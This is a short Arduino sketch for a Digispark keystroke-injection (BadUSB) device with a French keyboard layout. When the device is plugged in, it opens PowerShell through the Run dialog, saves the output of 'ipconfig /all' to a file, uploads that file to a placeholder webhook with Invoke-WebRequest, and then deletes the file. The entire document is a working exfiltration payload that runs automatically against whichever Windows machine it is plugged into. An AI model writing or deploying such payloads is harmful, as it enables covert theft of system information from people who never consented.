#include <DigiKeyboardFr.h>

void setup() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
  DigiKeyboard.delay(500);
  DigiKeyboardFr.println("powershell"); 
  DigiKeyboard.delay(2000);
  DigiKeyboardFr.println("ipconfig /all > test.txt; Invoke-WebRequest -Uri votre_webhook_ici -Method POST -InFile test.txt; rm test.txt; exit");
}

void loop() {}
